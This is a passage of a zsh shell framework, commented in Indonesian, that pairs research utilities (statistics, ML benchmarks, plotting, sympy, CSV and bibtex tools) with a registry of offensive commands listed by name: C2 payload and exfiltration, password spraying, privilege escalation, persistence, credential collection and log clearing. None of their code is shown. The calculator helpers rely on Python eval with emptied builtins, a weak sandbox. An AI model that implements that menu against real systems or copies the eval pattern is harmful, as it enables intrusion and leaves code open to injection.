        l)   git tag --sort=-creatordate 2>&1 | head -15 ;;
        *)   _anf_log warn "Usage: /mvp [tag <t>|v|b <name>|s <name>|l]"; return 1;;
    esac
}

# -----------------------------------------------------------------------------
# Registrasi command enterprise (dijalankan di akhir — tetap sesudah definisi).
# -----------------------------------------------------------------------------
_ANF_CMD_DESC+=( \
    gen     "AI-assisted code generation (# calls hermes/opencode)" \
    task    "Orchestrator task di tmux latar (survive restart)" \
    q       "Pencarian cepat grep dalam project" \
    gitx    "Git quick-ops harian (status/add/commit/log/branch/pull)" \
    envcard "Ringkasan environment & tools sekali lihat" \
    mvp     "Multi-version & branch management" \
    why     "Value proposition ANF (mengapa bukan terminal lain)" \
)
typeset -ga _ANF_CMD_NAMES=(${(k)_ANF_CMD_DESC})
# Tidak ada alias berprefix "/" di sini: zsh memperlakukan "/cmd" sebagai path,
# jadi alias itu tidak pernah aktif. Alias nama polos didaftarkan oleh satu loop
# di akhir file (lihat SECTION 17).
# ==============================================================================
# SECTION 14 — ANF Research Suite (untuk peneliti: science, math, CS, cyber)
# Fokus audiens: researcher yang butuh statistik, ML/DL reproducible,
# benchmark, katalog dataset, dan navigasi cyber (MITRE) dari satu antarmuka.
# Python dipakai dari venv riset bila ada (torch/sklearn/numpy), fallback python3.
# ==============================================================================

# Locate best python (repo-local .venv dulu, lalu venv riset $HOME, fallback python3)
_anf_py() {
    if [[ -n "${PYTHON:-}" && -x "${PYTHON:-}" ]]; then
        print -r -- "${PYTHON:-}"
    elif [[ -x "$HOME/venv/bin/python" ]]; then
        print -r -- "$HOME/venv/bin/python"
    elif [[ -x "$HOME/Documents/ANF-Research-Shell/.venv/bin/python" ]]; then
        print -r -- "$HOME/Documents/ANF-Research-Shell/.venv/bin/python"
    else
        print -r -- "python3"
    fi
}

# -----------------------------------------------------------------------------
# /mlinfo — cek stack ML/DL tersedia (peneliti butuh tahu lingkungan)
# -----------------------------------------------------------------------------
anf_mlinfo() {
    local py; py="$(_anf_py)"
    print "${C_M}── ML/DL Stack ──${C_0}"
    print "  Python : $("$py" -c 'import sys; print(sys.version.split()[0])' 2>/dev/null || echo 'n/a')"
    print "  numpy  : $("$py" -c 'import numpy; print(numpy.__version__)' 2>/dev/null || echo 'TIDAK ADA')"
    print "  sklearn: $("$py" -c 'import sklearn; print(sklearn.__version__)' 2>/dev/null || echo 'TIDAK ADA')"
    print "  torch  : $("$py" -c 'import torch; print(torch.__version__, "cuda=" + str(torch.cuda.is_available()))' 2>/dev/null || echo 'TIDAK ADA')"
    print "${C_T}Catatan: CUDA=False → DL jalan CPU-only (lambat untuk model besar; cukup untuk smoke/uji kecil).${C_0}"
}

# -----------------------------------------------------------------------------
# /stat — statistik dataset numerik dari file/pipe (satu kolom per baris)
# /stat <file> [col]  |  echo "1 2 3" | anf stat
# -----------------------------------------------------------------------------
anf_stat() {
    local file="${1:-/dev/stdin}"; local col="${2:-1}"
    if [[ "$file" != "/dev/stdin" && ! -f "$file" ]]; then _anf_log err "File tidak ada: $file"; return 1; fi
    local py; py="$(_anf_py)"
    "$py" - "$file" "$col" <<'PYEOF'
import sys, math
from collections import Counter
fn, col = sys.argv[1], int(sys.argv[2])
vals = []
with open(fn, 'r', errors='replace') as fh:
    for line in fh:
        parts = line.split()
        if len(parts) >= col:
            try: vals.append(float(parts[col-1]))
            except ValueError: pass
if not vals:
    print("tidak ada data numerik"); sys.exit(1)
n = len(vals); mu = sum(vals)/n
s2 = sum((x-mu)**2 for x in vals)/(n-1) if n > 1 else 0.0
sd = math.sqrt(s2)
cnt = Counter(vals)
ent = -sum((v/n)*math.log2(v/n) for v in cnt.values()) if n else 0.0
sv = sorted(vals)
med = sv[n//2] if n % 2 else (sv[n//2-1]+sv[n//2])/2
print(f"n      = {n}")
print(f"min    = {min(vals):.6g}")
print(f"max    = {max(vals):.6g}")
print(f"mean   = {mu:.6g}")
print(f"median = {med:.6g}")
print(f"std    = {sd:.6g}")
print(f"entropy= {ent:.6g} bits")
PYEOF
}

# -----------------------------------------------------------------------------
# /mlbench — benchmark deterministik: baseline entropy-threshold vs IsolationForest
# /mlbench <n> [out.csv]  -> hasil ditulis ke research/outputs bila out.csv
# -----------------------------------------------------------------------------
anf_mlbench() {
    local n="${1:-400}" out="${2:-}"
    local py; py="$(_anf_py)"
    if [[ -z "$out" ]]; then
        local dir="${ANF_RESEARCH_DIR:-$HOME/Documents/ANF-Research-Shell/research/outputs}"
        out="$dir/mlbench_$(date +%Y%m%d_%H%M%S).csv"
        mkdir -p "$(dirname "$out")"
    fi
    print "${C_M}── MLBench (seed=42, deterministic) — n=$n ──${C_0}"
    "$py" - "$n" "$out" <<'PYEOF'
import sys, random, csv, math
from collections import Counter
n = int(sys.argv[1]); out = sys.argv[2]
random.seed(42)
def entropy(s):
    if not s: return 0.0
    c = Counter(s); l = len(s)
    return -sum((v/l)*math.log2(v/l) for v in c.values())
def gen(n):
    X, y = [], []
    for _ in range(n//4):
        X.append(entropy(''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=200)))); y.append(0)
    for _ in range(n//4):
        b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        X.append(entropy(''.join(random.choices(b, k=200)))); y.append(0)
    for _ in range(n//2):
        X.append(entropy(''.join(chr(random.randint(0,255)) for _ in range(200)))); y.append(1)
    return X, y
X, y = gen(n)
# baseline: threshold entropy sweep
best_f1, best_t = 0, 0
for t100 in range(300, 800, 5):
    t = t100/100
    preds = [1 if s > t else 0 for s in X]
    tp = sum(1 for p,l in zip(preds,y) if p==1 and l==1)
    fp = sum(1 for p,l in zip(preds,y) if p==1 and l==0)
    fn = sum(1 for p,l in zip(preds,y) if p==0 and l==1)
    pr = tp/(tp+fp) if tp+fp else 0; rc = tp/(tp+fn) if tp+fn else 0
    f1 = 2*pr*rc/(pr+rc) if pr+rc else 0
    if f1 > best_f1: best_f1, best_t = f1, t
# IsolationForest
iso_preds = []
try:
    from sklearn.ensemble import IsolationForest
    import numpy as np
    Xa = np.array(X).reshape(-1, 1)
    random.seed(42)
    clf = IsolationForest(n_estimators=50, contamination=0.5, random_state=42).fit(Xa)
    p = clf.predict(Xa)  # -1 = outlier
    iso_preds = [1 if v == -1 else 0 for v in p]
    tp = sum(1 for p_,l in zip(iso_preds,y) if p_==1 and l==1)
    fp = sum(1 for p_,l in zip(iso_preds,y) if p_==1 and l==0)
    fn = sum(1 for p_,l in zip(iso_preds,y) if p_==0 and l==1)
    pr = tp/(tp+fp) if tp+fp else 0; rc = tp/(tp+fn) if tp+fn else 0
    iso_f1 = 2*pr*rc/(pr+rc) if pr+rc else 0.0
    iso_ok = True
except Exception as e:
    iso_f1 = float('nan'); iso_ok = False; err = str(e)
with open(out, 'w', newline='') as fh:
    w = csv.writer(fh)
    w.writerow(['model','f1','threshold','sklearn_available'])
    w.writerow(['entropy-baseline', round(best_f1,4), best_t, 'true'])
    w.writerow(['isolation-forest', round(iso_f1,4), 'na', str(iso_ok).lower()])
print(f"  entropy-baseline F1={best_f1:.4f}  (threshold H>{best_t:.2f})")
if iso_ok: print(f"  isolation-forest F1={iso_f1:.4f}  (n_est=50, seed=42)")
else:      print(f"  isolation-forest: sklearn tidak tersedia — {err}")
print(f"  hasil -> {out}")
PYEOF
}

# -----------------------------------------------------------------------------
# /dlcheck — smoke test DL CPU (torch forward pass kecil, deterministik)
# /dlcheck            -> ringkas;  /dlcheck full  -> trein 3 epoch mini
# -----------------------------------------------------------------------------
anf_dlcheck() {
    local mode="${1:-quick}"
    local py; py="$(_anf_py)"
    if [[ "$mode" == "full" ]]; then
        print "${C_M}── DL check (full: mini-MLP 3 epoch on synthetic) ──${C_0}"
        "$py" - <<'PYEOF'
import random, math
try:
    import torch, torch.nn as nn
except ImportError:
    print("torch TIDAK tersedia — DL check skipped"); raise SystemExit(0)
torch.manual_seed(42); random.seed(42)
X = torch.rand(256, 8); y = (X.sum(1) > 4).float().view(-1,1)
net = nn.Sequential(nn.Linear(8,16), nn.ReLU(), nn.Linear(16,1))
opt = torch.optim.Adam(net.parameters(), lr=0.01); lossf = nn.BCEWithLogitsLoss()
for ep in range(3):
    opt.zero_grad(); out = net(X)
    loss = lossf(out, y); loss.backward(); opt.step()
    if ep == 0 or ep == 2:
        acc = ((out > 0).float() == y).float().mean().item()
        print(f"  epoch {ep+1}: loss={loss.item():.4f} acc={acc:.4f}")
print("  DL CPU smoke test OK (deterministik, seed=42)")
PYEOF
    else
        "$py" - <<'PYEOF'
try:
    import torch
except ImportError:
    print("torch TIDAK tersedia"); raise SystemExit(0)
torch.manual_seed(42)
x = torch.randn(4, 4); y = x @ x.T
print(f"  torch {torch.__version__} | matmul ok, shape={tuple(y.shape)} | cuda={torch.cuda.is_available()}")
PYEOF
    fi
}

# -----------------------------------------------------------------------------
# /dataset — registry dataset riset (lokasi, kelas, tahun) — edit manual
# -----------------------------------------------------------------------------
anf_dataset() {
    local action="${1:-list}"
    local defs="$ANF_CACHE_DIR/datasets.tsv"
    case "$action" in
        list)
            if [[ -f "$defs" ]]; then
                print "${C_M}── Dataset registry (${defs}) ──${C_0}"
                column -t -s $'\t' "$defs" 2>/dev/null || cat "$defs"
            else
                print "${C_T}Belum ada registry. Tambah: /dataset add <nama> <path> <kelas>${C_0}"
            fi ;;
        add)
            local name="${2:-}" pth="${3:-}" cls="${4:-}"
            [[ -z "$name" || -z "$pth" ]] && { _anf_log warn "Usage: /dataset add <nama> <path> <kelas>"; return 1; }
            mkdir -p "$(dirname "$defs")"
            if [[ ! -f "$defs" ]]; then
                print "nama\tpath\tkelas" > "$defs.tmp"
            else
                cp "$defs" "$defs.tmp"
            fi
            print "$name\t$pth\t${cls:-?}" >> "$defs.tmp"
            mv "$defs.tmp" "$defs"
            _anf_log ok "Dataset '$name' ditambahkan" ;;
        *) _anf_log warn "Usage: /dataset [list|add]"; return 1;;
    esac
}

# -----------------------------------------------------------------------------
# /paperstat — statistik manuskrip (kata/baris/ref/fitur) untuk peneliti
# /paperstat <file.md|tex>
# -----------------------------------------------------------------------------
anf_paperstat() {
    local f="${1:-}"
    [[ -z "$f" || ! -f "$f" ]] && { _anf_log warn "Usage: /paperstat <file.md|tex>"; return 1; }
    local words lines refs
    words=$(wc -w < "$f" | tr -d ' ')
    lines=$(wc -l < "$f" | tr -d ' ')
    refs=$(grep -icE "\\\\cite\{|^#+ .*\[[0-9]+\]|\[\^?[0-9]+\]" "$f" 2>/dev/null || true)
    print "${C_M}── Paper statistics: $(basename "$f") ──${C_0}"
    print "  kata  : $words"
    print "  baris : $lines"
    print "  rujukan matches (estimasi): $refs"
    print "  ukuran: $(du -h "$f" | cut -f1)"
}

# -----------------------------------------------------------------------------
# Registrasi command research/science
# -----------------------------------------------------------------------------
_ANF_CMD_DESC+=( \
    mlinfo   "Cek stack ML/DL (torch/sklearn/numpy/CUDA)" \
    stat     "Statistik dataset numerik (mean/median/std/entropy)" \
    mlbench  "Benchmark deterministik baseline vs IsolationForest -> CSV" \
    dlcheck  "Smoke test DL CPU (torch, deterministic)" \
    dataset  "Registry dataset riset (list/add)" \
    paperstat "Statistik manuskrip (kata/baris/ref)" \
)
typeset -ga _ANF_CMD_NAMES=(${(k)_ANF_CMD_DESC})

# ==============================================================================
# SECTION 15 — ANF Researcher Workflow v1.4
# Melengkapi riset via terminal: visualisasi, kalkulasi, reproduksibilitas,
# data wrangling, bibliografi. Python dari venv riset bila ada.
# ==============================================================================

# -----------------------------------------------------------------------------
# /plot — visualisasi data cepat (histogram/scatter/line) -> PNG research/outputs
# /plot <file.csv> [col] [hist|scatter|line] [title]
# -----------------------------------------------------------------------------
anf_plot() {
    local file="${1:-}"; local col="${2:-1}" kind="${3:-hist}" title="${4:-ANF plot}"
    [[ -z "$file" || ! -f "$file" ]] && { _anf_log warn "Usage: /plot <file.csv> [col] [hist|scatter|line] [title]"; return 1; }
    local py; py="$(_anf_py)"
    local dir="${ANF_RESEARCH_DIR:-$HOME/Documents/ANF-Research-Shell/research/outputs}"
    mkdir -p "$dir"
    local out="$dir/plot_$(basename "$file" .csv)_$(date +%Y%m%d_%H%M%S).png"
    "$py" - "$file" "$col" "$kind" "$title" "$out" <<'PYEOF'
import sys
file, col, kind, title, out = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import pandas as pd
except ImportError:
    print("matplotlib/pandas tidak tersedia di venv"); sys.exit(1)
try:
    df = pd.read_csv(file)
except Exception as e:
    print(f"gagal baca CSV: {e}"); sys.exit(1)
if kind == 'line':
    xs = range(len(df)); ys = df.iloc[:, col-1]
    plt.plot(xs, ys); plt.xlabel('index'); plt.ylabel(df.columns[col-1])
elif kind == 'scatter':
    plt.scatter(df.iloc[:, 0], df.iloc[:, col-1], s=6, alpha=0.6)
    plt.xlabel(df.columns[0]); plt.ylabel(df.columns[col-1])
else:
    plt.hist(df.iloc[:, col-1], bins=30, alpha=0.7)
    plt.xlabel(df.columns[col-1]); plt.ylabel('frekuensi')
plt.title(title)
plt.tight_layout(); plt.savefig(out, dpi=150)
print(f"plot -> {out}")
PYEOF
}

# -----------------------------------------------------------------------------
# /calc — kalkulator ilmiah: ekspresi numerik python aman (tanpa eval-zsh)
# /calc "2**10"  |  /calc "sqrt(144)"  |  /calc "sin(pi/6)"
# -----------------------------------------------------------------------------
anf_calc() {
    local expr="${*:-}"
    [[ -z "$expr" ]] && { _anf_log warn "Usage: /calc <ekspresi matematika (python)>"; return 1; }
    local py; py="$(_anf_py)"
    "$py" - "$expr" <<'PYEOF'
import sys, math
e = sys.argv[1]
ns = {**vars(math), 'pi': math.pi, 'e': math.e}
try:
    r = eval(e, {"__builtins__": {}}, ns)
    print(f"{e} = {r:.10g}" if isinstance(r, float) else f"{e} = {r}")
except Exception as ex:
    print(f"error: {ex}"); sys.exit(1)
PYEOF
}

# -----------------------------------------------------------------------------
# /sym — matematika simbolik via sympy (integral, turunan, simplify)
# /sym "integrate(x**2, x)"  |  /sym "diff(sin(x)*exp(x), x)"
# -----------------------------------------------------------------------------
anf_sym() {
    local expr="${*:-}"
    [[ -z "$expr" ]] && { _anf_log warn "Usage: /sym <ekspresi sympy>"; return 1; }
    local py; py="$(_anf_py)"
    "$py" - "$expr" <<'PYEOF'
import sys
e = sys.argv[1]
try:
    import sympy as sp
    x, y = sp.symbols('x y')
    r = eval(e, {"__builtins__": {}, "sp": sp, "x": x, "y": y, "symbols": sp.symbols,
                 "integrate": sp.integrate, "diff": sp.diff, "simplify": sp.simplify,
                 "expand": sp.expand, "limit": sp.limit, "series": sp.series,
                 "solve": sp.solve, "Rational": sp.Rational,
                 "sin": sp.sin, "cos": sp.cos, "tan": sp.tan,
                 "exp": sp.exp, "log": sp.log, "sqrt": sp.sqrt,
                 "oo": sp.oo, "pi": sp.pi, "E": sp.E, "I": sp.I})
    print(sp.sstr(r))
except ImportError:
    print("sympy tidak tersedia"); sys.exit(1)
except Exception as ex:
    print(f"error: {ex}"); sys.exit(1)
PYEOF
}

# -----------------------------------------------------------------------------
# /sha — checksum reproducibility (sha256) untuk manifest
# /sha <file>   |  /sha dir <dir>  (semua file, kedalaman 2)
# -----------------------------------------------------------------------------
anf_sha() {
    local target="${1:-}"; local mode="${2:-}"
    [[ -z "$target" ]] && { _anf_log warn "Usage: /sha <file>  |  /sha dir <dir>"; return 1; }
    if [[ "$target" == "dir" ]]; then
        local d="${2:-.}"
        [[ ! -d "$d" ]] && { _anf_log err "Dir tidak ada: $d"; return 1; }
        find "$d" -maxdepth 2 -type f -not -path '*/.git/*' -exec sha256sum {} \; 2>/dev/null | head -30
    else
        [[ ! -f "$target" ]] && { _anf_log err "File tidak ada: $target"; return 1; }
        sha256sum "$target"
    fi
}

# -----------------------------------------------------------------------------
# /exp — scaffold eksperimen reproducible: folder + seed + env snapshot
# /exp <nama>  -> research/outputs/exp_<nama>_<ts>/ {run.sh, env.txt, seed.txt}
# -----------------------------------------------------------------------------
anf_exp() {
    local name="${1:-exp}"
    local py; py="$(_anf_py)"
    local dir="${ANF_RESEARCH_DIR:-$HOME/Documents/ANF-Research-Shell/research/outputs}"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local expdir="$dir/exp_${name}_${ts}"
    mkdir -p "$expdir"
    # seed.txt
    "$py" -c "import random; random.seed(${ANF_SEED:-42}); print('SEED=%d' % ${ANF_SEED:-42}); print('random_int=%d' % random.randint(0,10**9))" > "$expdir/seed.txt" 2>&1
    # env.txt
    {
        echo "== env =="
        "$py" -c "import sys; print('python', sys.version.split()[0])"
        "$py" -c "import numpy; print('numpy', numpy.__version__)" 2>/dev/null || echo "numpy n/a"
        "$py" -c "import torch; print('torch', torch.__version__, 'cuda=', torch.cuda.is_available())" 2>/dev/null || echo "torch n/a"
        echo "== date =="; date -u +%Y-%m-%dT%H:%M:%SZ
    } > "$expdir/env.txt" 2>&1
    # run.sh stub
    print "#!/usr/bin/env bash" > "$expdir/run.sh"
    print "# Isi command eksperimenmu di sini. Deterministik: pakai seed dari seed.txt." >> "$expdir/run.sh"
    print "# Contoh: python3 train.py --seed $(grep -o 'SEED=[0-9]*' "$expdir/seed.txt" | cut -d= -f2)" >> "$expdir/run.sh"
    chmod +x "$expdir/run.sh"
    _anf_log ok "Eksperimen '$name' dibuat: $expdir"
    ls "$expdir"
}

# -----------------------------------------------------------------------------
# /csv — data wrangling cepat: head / summary / kolom
# /csv head <file> [n]  |  /csv summary <file>  |  /csv cols <file>
# -----------------------------------------------------------------------------
anf_csv() {
    local op="${1:-head}" file="${2:-}"; local n="${3:-5}"
    [[ -z "$file" || ! -f "$file" ]] && { _anf_log warn "Usage: /csv [head|summary|cols] <file.csv> [n]"; return 1; }
    local py; py="$(_anf_py)"
    case "$op" in
        head)    "$py" - "$file" "$n" <<'PYEOF'
import sys
try:
    import pandas as pd
    df = pd.read_csv(sys.argv[1])
    print(df.head(int(sys.argv[2])).to_string(index=False))
except FileNotFoundError:
    print(f"file tidak ditemukan: {sys.argv[1]}"); sys.exit(1)
except Exception as e:
    print(f"gagal baca CSV (pastikan file CSV rapi): {type(e).__name__}: {e}"); sys.exit(1)
PYEOF
                 ;;
        summary) "$py" - "$file" <<'PYEOF'
import sys
try:
    import pandas as pd
    df = pd.read_csv(sys.argv[1])
    print(f"baris={len(df)} kolom={len(df.columns)}")
    print(df.describe(include='all').to_string())
except FileNotFoundError:
    print(f"file tidak ditemukan: {sys.argv[1]}"); sys.exit(1)
except Exception as e:
    print(f"gagal baca CSV (pastikan file CSV rapi): {type(e).__name__}: {e}"); sys.exit(1)
PYEOF
                 ;;
        cols)    "$py" - "$file" <<'PYEOF'
import sys
try:
    import pandas as pd
    df = pd.read_csv(sys.argv[1])
    for i, c in enumerate(df.columns, 1):
        print(f"  {i}. {c}  ({df[c].dtype})")
except FileNotFoundError:
    print(f"file tidak ditemukan: {sys.argv[1]}"); sys.exit(1)
except Exception as e:
    print(f"gagal baca CSV (pastikan file CSV rapi): {type(e).__name__}: {e}"); sys.exit(1)
PYEOF
                 ;;
        *) _anf_log warn "Usage: /csv [head|summary|cols] <file.csv> [n]"; return 1;;
    esac
}

# -----------------------------------------------------------------------------
# /bib — validasi bibliografi .bib (count, duplikat, entry rusak)
# /bib <file.bib>
# -----------------------------------------------------------------------------
anf_bib() {
    local f="${1:-}"
    [[ -z "$f" || ! -f "$f" ]] && { _anf_log warn "Usage: /bib <file.bib>"; return 1; }
    local py; py="$(_anf_py)"
    "$py" - "$f" <<'PYEOF'
import sys, re
fn = sys.argv[1]
try:
    with open(fn, errors='replace') as fh:
        keys, dup, types, bad = [], set(), {}, 0
        cur = None
        for line in fh:
            m = re.match(r'@(\w+)\{([^,]+),', line)
            if m:
                t, k = m.group(1).lower(), m.group(2).strip()
                if k in keys: dup.add(k)
                keys.append(k); types[t] = types.get(t, 0) + 1; cur = k
            elif '}' in line:
                cur = None
            elif cur and ('=' not in line) and line.strip() and not line.strip().startswith('%') and not line.strip().startswith('@'):
                bad += 1
except FileNotFoundError:
    print(f"file tidak ditemukan: {fn}"); sys.exit(1)
except Exception as e:
    print(f"gagal baca .bib: {type(e).__name__}: {e}"); sys.exit(1)
print(f"total entries : {len(keys)}")
print(f"duplikat      : {len(dup)}  {sorted(dup)[:10]}")
print("tipe          : " + ", ".join(f"{k}={v}" for k, v in sorted(types.items())))
print(f"baris mencurigakan: {bad}")
PYEOF
}

# -----------------------------------------------------------------------------
# Registrasi command researcher workflow
# -----------------------------------------------------------------------------
_ANF_CMD_DESC+=( \
    plot   "Visualisasi data cepat -> PNG ke research/outputs" \
    calc   "Kalkulator ilmiah (ekspresi python matematika)" \
    sym    "Matematika simbolik (integral/turunan via sympy)" \
    sha    "Checksum sha256 (reproducibility manifest)" \
    exp    "Scaffold eksperimen reproducible (folder+seed+env)" \
    csv    "Data wrangling CSV (head/summary/cols via pandas)" \
    bib    "Validasi bibliografi .bib (count/duplikat/tipe)" \
)
typeset -ga _ANF_CMD_NAMES=(${(k)_ANF_CMD_DESC})
# ==============================================================================
# SECTION 16 — ANF Auto-Provisioning (Linux-focused) v1.5
# /ensure — cek & auto-install tool yang belum ada di sistem.
# Fokus Linux (apt/pacman/dnf); brew sebagai fallback. Selalu konfirmasi dulu.
# ==============================================================================

# Tool wajib & opsional, dengan nama paket per package manager.
# Format: "binary:pkg-apt:pkg-pacman:pkg-dnf:pkg-brew:urgent(1|0)"
_anf_pkg_map() {
    # $1 = "binary:pkg-apt:pkg-pacman:pkg-dnf:pkg-brew:urgent"
    local entry="$1" mgr="$2"
    local binary="${entry%%:*}" rest="${entry#*:}"
    local p_apt="${rest%%:*}" rest="${rest#*:}"
    local p_pac="${rest%%:*}" rest="${rest#*:}"
    local p_dnf="${rest%%:*}" rest="${rest#*:}"
    local p_brew="${rest%%:*}" urgent="${rest#*:}"
    case "$mgr" in
        apt)    print -r -- "$p_apt" ;;
        pacman) print -r -- "$p_pac" ;;
        dnf)    print -r -- "$p_dnf" ;;
        brew)   print -r -- "$p_brew" ;;
        *)      print -r -- "$binary" ;;
    esac
}

_anf_pkg_urgent() {
    local entry="$1"
    print -r -- "${entry##*:}"
}

# /ensure — cek (mode doctor) & auto-install (mode all) tool yang belum ada.
# Diport verbatim dari ANF Research Shell saat merge; sebelumnya entri
# `ensure` sudah terdaftar di _ANF_CMD_DESC tapi fungsinya tertinggal →
# gate #4 (mapping /cmd→fungsi) MERAH dan command `ensure` mati.
anf_ensure() {
    local mode="${1:-doctor}"
    local mgr; mgr="$(_anf_get_pkg_mgr)"
    if [[ "$mgr" == "unknown" ]]; then
        _anf_log err "Package manager tidak terdeteksi (bukan apt/pacman/dnf/brew)."
        return 1
    fi
    if [[ "$mgr" == "brew" ]]; then
        _anf_log warn "Terdeteksi brew — ANF auto-install UTAMA untuk Linux; brew dipakai sebagai fallback."
    fi

    local -a missing=()
    local entry binary pkg urgent i=0
    for entry in "${_ANF_REQUIRED_TOOLS[@]}"; do
        binary="${entry%%:*}"
        if ! _anf_has_bin "$binary"; then
            missing+=("$entry")
        fi
    done

    print "${C_M}── ANF Auto-Provisioning (pkg manager: $mgr) ──${C_0}"
    if (( ${#missing} == 0 )); then
        print "${C_G}✓ Semua tool wajib & opsional sudah terpasang.${C_0}"
        return 0
    fi

    print "${C_Y}Tool yang belum ada:${C_0}"
    for entry in "${missing[@]}"; do
        binary="${entry%%:*}"
        pkg="$(_anf_pkg_map "$entry" "$mgr")"
        urgent="$(_anf_pkg_urgent "$entry")"
        if [[ "$urgent" == 1 ]]; then
            print "  ${i}) $binary  (paket: $pkg) [wajib]"
        else
            print "  ${i}) $binary  (paket: $pkg)"
        fi
        (( i++ ))
    done

    if [[ "$mode" == "all" || "$mode" == "install" ]]; then
        local cmd="" pkg
        case "$mgr" in
            apt)    cmd="sudo apt-get update && sudo apt-get install -y" ;;
            pacman) cmd="sudo pacman -S --noconfirm" ;;
            dnf)    cmd="sudo dnf install -y" ;;
            brew)   cmd="brew install" ;;
        esac
        local -a pkgs=()
        for entry in "${missing[@]}"; do
            pkg="$(_anf_pkg_map "$entry" "$mgr")"
            pkgs+=("$pkg")
        done
        _anf_log warn "Akan menjalankan: $cmd ${pkgs[*]}"
        _anf_log warn "Butuh password sudo (jika apt/pacman/dnf). Lanjut? [y/N]"
        read -q "REPLY?" || { _anf_log info "Dibatalkan."; return 1; }
        print ""
        _anf_log info "Menjalankan instalasi..."
        eval "$cmd ${pkgs[*]}"
        local rc=$?
        if (( rc == 0 )); then
            _anf_log ok "Instalasi selesai."
        else
            _anf_log err "Instalasi gagal (rc=$rc). Coba manual: $cmd ${pkgs[*]}"
            return $rc
        fi
    else
        _anf_log info "Mode doctor (kering). Jalankan 'ensure all' untuk auto-install."
    fi
    return 0
}



# SECTION 10 — Command Registration & Categorized Help
# ==============================================================================
typeset -gA _ANF_CMD_DESC
_ANF_CMD_DESC=(
    # Core
    help               "Tampilkan help (kategorisasi)"
    status             "Status target & workspace"
    set-target         "Set target host"
    reset-target       "Hapus target"
    workspace          "Ganti workspace"
    note               "Tambah catatan"
    doctor             "Cek tool availability"
    # Recon
    scan               "Nmap -sV -sC scan"
    subdomains         "Subdomain enumeration"
    serve              "Jalankan HTTP server"
    listen             "Netcat listener"
    # OPSEC
    panic              "Panic: sanitize shell"
    tor                "Toggle Tor proxy"
    encode             "Base64 encode"
    decode             "Base64 decode"
    hash               "MD5/SHA256/SHA512 hash"
    serve-stop         "Stop HTTP server"
    # C2
    c2-start           "Start C2 server (hardened v2)"
    c2-stop            "Stop C2 server"
    c2-sessions        "Lihat session log C2"
    # Math/ML
    c2-entropy         "Shannon Entropy + Bootstrap CI"
    c2-beacon-math     "Beaconing: Jitter + Chi-Square + R(1)"
    c2-ml-hunt         "Isolation Forest anomaly detection"
    c2-zscore          "Z-Score baseline (perbandingan)"
    # Security
    guardfall-metrics  "GuardFall v2 TP/FP/F1 metrics"
    benchmark-guardfall "Benchmark GuardFall (labeled dataset)"
    # Evaluation
    eval-entropy-roc   "ROC sweep untuk entropy threshold (CSV)"
    eval-compare-ml    "Z-Score vs Isolation Forest comparison"
    eval-export-audit  "Export audit log ke CSV"
    # Defense
    osint-email        "OSINT via email (holehe)"
    autopwn            "Nuclei AutoPwn"
    suricata           "Start Suricata IDS"
    yara-scan          "Yara rule scan"
    # Output
    report             "Generate Markdown report"
    sysinfo            "Simpan info sistem"
    config "Tampilkan cache & target"
    paths "Tampilkan path cache & log"
    version "Versi framework"
    install "Install package"
    selftest "Self-test"
    update "Update dari git"
    targets "Kelola daftar target"
    log "Lihat log"
    subdomains-json "Subdomain JSON"
    dns "DNS lookup"
    whois "Whois"
    quickrecon "Recon cepat"
    wifisurvey "WiFi survey"
    monitor "Monitor mode"
    mac "MAC"
    pilgrims "Pilgrims"
    screenshot "Screenshot"
    uuid "UUID"
    random "Random"
    epoch "Epoch"
    clip "Clipboard"
    check-ip "Check IP"
    clear-ip "Clear IP"
    proxy "HTTP proxy"
    hermes "Hermes"
    hermes-locate "Cari hermes"
    hermes-set "Set hermes"
    github "GitHub CLI"
    amass "Amass"
    gobuster "Gobuster"
    nikto "Nikto"
    whatweb "WhatWeb"
    c2-payload "C2 payload"
    c2-interact "C2 interact"
    c2-exfil "C2 exfil"
    c2-decode "C2 decode"
    osint-phone "OSINT phone"
    cloud-enum "Cloud enum"
    wayback "Wayback"
    priv-esc "PrivEsc"
    password-spray "Password spray"
    pivot-socks "SOCKS pivot"
    port-forward "Port forward"
    ssh-tunnel "SSH tunnel"
    honeypot "Honeypot"
    wazuh-agent "Wazuh"
    persist "Persist"
    credentials "Credentials"
    screenshot-all "Remote screenshot"
    clear-logs "Clear logs"
    playbook "Playbook"
    ai-assist "AI assist"
    ai-log "AI log"
    # Research Suite (merged)
    why               "Positioning ANF (satu cerita)"
    gen               "AI code gen via hermes/opencode"
    task              "Orchestrator task tmux (start/list/attach/kill)"
    q                 "Grep cepat project (skip .git/node_modules/venv)"
    gitx              "Git quick-ops (s/a/c/l/b/p/d/x)"
    envcard           "Ringkasan OS/disk/mem/tools"
    mvp               "Version & branch mgmt (tag/v/b/s/l)"
    mlinfo            "Stack ML/DL: torch/sklearn/numpy/CUDA"
    stat              "Statistik dataset (mean/median/std/entropy)"
    mlbench           "Benchmark deterministik -> CSV research/outputs"
    dlcheck           "Smoke DL CPU (torch seed=42)"
    dataset           "Registry dataset riset (TSV persist)"
    paperstat         "Statistik kata/baris/ref manuskrip"
    plot              "Visualisasi matplotlib -> PNG"
    calc              "Kalkulator ilmiah (python math)"
    sym               "Matematika simbolik (sympy)"
    sha               "Checksum sha256 (reproducibility)"
    exp               "Scaffold eksperimen reproducible"
    csv               "Data wrangling CSV (pandas)"
    bib               "Validasi bibliografi .bib"
    ensure            "Auto-provisioning tool (doctor/all)"


)
typeset -ga _ANF_CMD_NAMES=(${(k)_ANF_CMD_DESC})

# NOTE: alias /cmd dibuat di bawah (setelah semua fungsi didefinisikan).
# Dulu di sini -> /help gagal karena anf_help belum ada saat loop.

# Help dikategorisasi [NEW-HELP]
anf_help() {
    _anf_box "$C_Y" "ANF SHELL (Cyber + Research) v${ANF_VERSION}"

        local -a categories=(
        "Core:help status set-target reset-target workspace note doctor config paths version install update selftest targets log"
        "Passthrough:run"
        "C2 Framework:c2-start c2-stop c2-sessions c2-payload c2-interact c2-exfil c2-decode"
        "Recon:scan subdomains subdomains-json dns whois quickrecon amass gobuster nikto whatweb wifisurvey monitor mac pilgrims"
        "OSINT:osint-email osint-phone cloud-enum wayback"
        "Exploitation:autopwn priv-esc password-spray pivot-socks port-forward ssh-tunnel"
